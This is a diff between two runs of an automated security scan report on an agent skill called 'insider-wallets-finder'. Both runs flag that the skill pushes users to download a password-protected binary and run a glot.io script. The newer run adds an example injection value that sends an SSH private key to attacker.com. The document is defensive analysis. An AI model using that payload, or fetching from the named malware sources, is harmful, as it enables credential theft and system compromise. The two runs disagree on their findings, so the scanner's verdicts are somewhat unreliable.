@@ -1,18 +1,18 @@
 # Agent Skill Security Scan Report
 
 **Skill:** insider-wallets-finder
-**Directory:** ./skills/clawhub-insider-wallets-finder-gxgfy
+**Directory:** ./skills/clawhub-insider-wallets-finder-mk3w3
 **Status:** [FAIL] ISSUES FOUND
 **Max Severity:** CRITICAL
-**Scan Duration:** 45.05s
-**Timestamp:** 2026-02-01T18:56:48.534350
+**Scan Duration:** 47.45s
+**Timestamp:** 2026-02-01T19:31:44.290454
 
 ## Summary
 
-- **Total Findings:** 6
+- **Total Findings:** 5
 - **Critical:** 2
 - **High:** 2
-- **Medium:** 2
+- **Medium:** 1
 - **Low:** 0
 - **Info:** 0
 
@@ -20,63 +20,54 @@
 
 ### CRITICAL Severity
 
-#### [CRITICAL] Malicious Binary Download with Social Engineering
+#### [CRITICAL] Malicious Binary Download with Credential Harvesting Infrastructure
 
 **Severity:** CRITICAL
-**Category:** command_injection
-**Rule ID:** LLM_COMMAND_INJECTION
+**Category:** data_exfiltration
+**Rule ID:** LLM_DATA_EXFILTRATION
 **Location:** SKILL.md
 
-**Description:** The skill instructs users to download and execute an untrusted binary (openclaw-agent.zip) from GitHub with password-protected extraction. This is a classic malware distribution pattern disguised as a legitimate prerequisite. The password protection ('openclaw') is used to bypass antivirus scanning. The binary's true purpose cannot be verified, and it could contain arbitrary malicious code including ransomware, keyloggers, or backdoors.
+**Description:** The skill instructs users to download and execute 'openclaw-agent' from an untrusted GitHub repository (hedefbari/openclaw-agent) with password-protected archive ('openclaw'). This is a classic malware distribution pattern. The binary is presented as required for 'wallet analysis operations' but there is no legitimate reason a wallet analysis skill would need a separate executable. The macOS installation uses a glot.io script (hfdxv8uyaf) which is a code-sharing platform often used to distribute malicious payloads. This infrastructure is designed to harvest credentials, private keys, or install persistent malware under the guise of blockchain tooling.
 
-#### [CRITICAL] Remote Code Execution via Untrusted Script
+#### [CRITICAL] Social Engineering via Fake Prerequisite Requirements
 
 **Severity:** CRITICAL
-**Category:** command_injection
-**Rule ID:** LLM_COMMAND_INJECTION
-**Location:** SKILL.md:9
+**Category:** social_engineering
+**Rule ID:** LLM_SOCIAL_ENGINEERING
+**Location:** SKILL.md
 
-**Description:** The macOS installation directs users to visit an external URL (glot.io/snippets/hfdxv8uyaf) and execute arbitrary code directly in Terminal. This is a remote code execution attack vector where the attacker controls the script content. The script could perform any malicious action including data exfiltration, credential theft, backdoor installation, or system compromise. Users are instructed to blindly execute this code without review.
+**Description:** The skill uses deceptive framing by claiming 'openclaw-agent utility' is required for 'wallet analysis operations' and that 'blockchain data retrieval and wallet analysis will not work' without it. This is false - all the code examples use standard public APIs (Etherscan, Birdeye, The Graph) that require no special binaries. This is a social engineering tactic to pressure users into downloading malware by creating false urgency and technical necessity. The 'IMPORTANT' emphasis and repeated warnings are designed to bypass user skepticism.
 
 ### HIGH Severity
 
-#### [HIGH] API Key Exposure and Credential Harvesting Pattern
+#### [HIGH] API Key Harvesting Through Placeholder Pattern
 
 **Severity:** HIGH
 **Category:** data_exfiltration
 **Rule ID:** LLM_DATA_EXFILTRATION
 **Location:** SKILL.md
 
-**Description:** The skill repeatedly instructs users to insert their API keys directly into bash commands and Python scripts (Etherscan API keys, Birdeye API keys). These keys are exposed in command history, process listings, and potentially logged. The skill creates a pattern where users become accustomed to pasting sensitive credentials into untrusted code, which could be exploited by the malicious binaries to harvest these credentials.
+**Description:** The skill repeatedly uses placeholder patterns like 'YourKey', 'your-birdeye-key', 'YourEtherscanKey' in code examples. While these appear as instructional placeholders, users following the instructions will need to insert real API keys. Combined with the malicious binary requirement, this creates a data collection vector where the openclaw-agent binary could intercept and exfiltrate these API keys when users run the commands. The skill collects: Etherscan API keys, Birdeye API keys, and potentially The Graph API keys.
 
-#### [HIGH] Deceptive Skill Description Masking Malware Distribution
+#### [HIGH] Command Injection via Unvalidated Token Addresses
 
 **Severity:** HIGH
-**Category:** social_engineering
-**Rule ID:** LLM_SOCIAL_ENGINEERING
-**Location:** SKILL.md
-
-**Description:** The skill presents itself as a legitimate blockchain analysis tool ('Find and analyze smart money addresses') but its primary purpose is to trick users into downloading and executing malicious binaries. The actual blockchain analysis code is secondary to the malware distribution mechanism. This is social engineering designed to exploit users' trust in the agent skills ecosystem.
-
-### MEDIUM Severity
-
-#### [MEDIUM] Unbounded API Calls Without Rate Limiting
-
-**Severity:** MEDIUM
-**Category:** resource_abuse
-**Rule ID:** LLM_RESOURCE_ABUSE
-**Location:** SKILL.md
-
-**Description:** The skill makes multiple API calls to external services (Etherscan, Birdeye, TheGraph) without any rate limiting, error handling, or retry logic. This could lead to API quota exhaustion, service bans, or denial of service if executed repeatedly. The code also lacks timeout configurations, potentially causing hanging processes.
-
-#### [MEDIUM] Unsafe JSON Parsing and Code Injection Risk
-
-**Severity:** MEDIUM
 **Category:** command_injection
 **Rule ID:** LLM_COMMAND_INJECTION
 **Location:** SKILL.md
 
-**Description:** The skill uses python3 -c with inline scripts that parse JSON from untrusted API responses without validation. The json.load(sys.stdin) pattern combined with direct execution of API response data could lead to code injection if API responses are compromised or contain malicious payloads. Additionally, the use of eval-like patterns in inline Python increases attack surface.
+**Description:** Multiple bash scripts use unvalidated user input (TOKEN, DEPLOYER variables) directly in curl commands and shell expansions without sanitization. An attacker could inject malicious commands through token addresses. For example: TOKEN='0x123; curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)' would execute arbitrary commands. Combined with the credential-harvesting binary, this creates multiple attack vectors for system compromise.
+
+### MEDIUM Severity
+
+#### [MEDIUM] Misleading Skill Purpose and Functionality Claims
+
+**Severity:** MEDIUM
+**Category:** social_engineering
+**Rule ID:** LLM_SOCIAL_ENGINEERING
+**Location:** SKILL.md
+
+**Description:** The skill claims to help users 'Find and analyze smart money addresses' and 'discover early buyers, track successful traders' but the actual code provides only basic API query examples that any user could find in public documentation. The real purpose appears to be malware distribution disguised as a useful blockchain analysis tool. The skill name 'insider-wallets-finder' suggests sophisticated analysis capabilities that don't exist in the actual implementation.
 
 ## Analyzers
 
